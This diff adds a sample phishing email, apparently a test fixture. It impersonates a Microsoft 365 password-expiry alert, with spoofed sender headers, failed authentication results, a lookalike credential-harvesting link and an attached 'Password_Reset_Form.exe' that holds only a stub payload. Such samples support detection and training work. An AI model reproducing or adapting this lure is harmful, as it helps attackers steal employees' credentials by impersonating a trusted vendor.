@@ -1,0 +1,40 @@
+Return-Path: <bounce@mail-relay-77.ru>
+Received: from mx01.cohencpa.com (10.20.4.11) by inbound.cohencpa.com
+ with Microsoft SMTP Server; Tue, 22 Sep 2026 09:14:22 -0400
+Received: from mail-relay-77.ru (193.42.18.204) by mx01.cohencpa.com
+ with SMTP; Tue, 22 Sep 2026 09:14:19 -0400
+Authentication-Results: cohencpa.com; spf=fail smtp.mailfrom=mail-relay-77.ru;
+ dkim=none header.d=none; dmarc=fail action=quarantine header.from=microsoft.com;
+ compauth=fail reason=001
+From: "Microsoft 365 Security <security@microsoft.com>" <alerts@m365-secure-notice.com>
+Reply-To: helpdesk@m365-secure-notice.ru
+To: hamzah.chaudhry@cohencpa.com
+Subject: Action Required: Your password expires in 24 hours
+Date: Tue, 22 Sep 2026 09:14:18 -0400
+Message-ID: <8812ac44-9f21-4a10-b3ff-77c1a0e29d41@m365-secure-notice.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="BOUND123"
+
+--BOUND123
+Content-Type: text/plain; charset="utf-8"
+
+Your Microsoft 365 password expires in 24 hours. Verify your account at
+https://login.microsoftonline.com.account-verify.m365-secure-notice.com/auth
+
+--BOUND123
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>Your Microsoft 365 password expires in 24 hours.</p>
+<p><a href="https://login.microsoftonline.com.account-verify.m365-secure-notice.com/auth">login.microsoftonline.com</a></p>
+<p><a href="https://www.w3.org/1999/xhtml">schema</a></p>
+</body></html>
+
+--BOUND123
+Content-Type: application/octet-stream; name="Password_Reset_Form.exe"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Password_Reset_Form.exe"
+
+TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAA=
+
+--BOUND123--
